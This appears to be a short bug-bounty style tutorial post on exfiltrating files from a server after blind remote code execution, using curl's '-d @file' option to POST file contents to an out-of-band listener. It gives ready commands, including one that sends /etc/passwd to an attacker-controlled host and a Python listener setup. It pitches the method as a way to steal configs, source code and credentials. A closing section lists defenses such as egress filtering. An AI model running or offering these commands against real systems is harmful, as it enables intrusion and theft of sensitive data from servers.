# Blind RCE File Exfiltration via `curl`
![Blind RCE File Exfiltration via curl - cybersecplayground](https://github.com/user-attachments/assets/13180932-3829-4771-900f-f6edad442587)

If you’ve landed a **Blind Remote Code Execution (RCE)** but can trigger outbound HTTP requests (**OOB — Out of Band**), you can steal files from the target server without direct output.

---

## 📌 Technique: Using `curl` with `-d @file`

When you run:
```bash
curl -d @index.php https://OOB_SERVER
```
- `-d @index.php` → Reads the entire file `index.php` and sends it in the HTTP request body.

The OOB server receives the full file contents, even if the RCE output is not directly visible.

---

## 📜 Example Exploit Flow

### 1. Control an OOB listener:
```bash
python3 -m http.server 8080
```
👉 Or use **Burp Collaborator** / **Interactsh**.

### 2. Trigger the Blind RCE on the target with:
```bash
curl -d @/etc/passwd https://your-server.com
```
The file contents are sent to your server in the POST request body.

---

## 🔥 Why This Works
- ⚡️ The `@` syntax in curl tells it to read a local file instead of sending raw text.
- ⚡️ Perfect for exfiltrating sensitive files (config files, source code, credentials) over HTTP in a single request.

---

## 🛡 Defense
- ✅ Restrict outbound HTTP requests from servers (**Egress filtering**).
- ✅ Disable `curl`, `wget`, and similar tools in restricted environments.
- ✅ Use Web Application Firewalls (**WAFs**) to detect suspicious HTTP patterns.

---

📢 Follow [@cybersecplayground](https://t.me/cybersecplayground) for more RCE & exfiltration tricks.

---

**Tags:** #RCE #BugBounty #curl #Exfiltration #Infosec #CyberSecurity
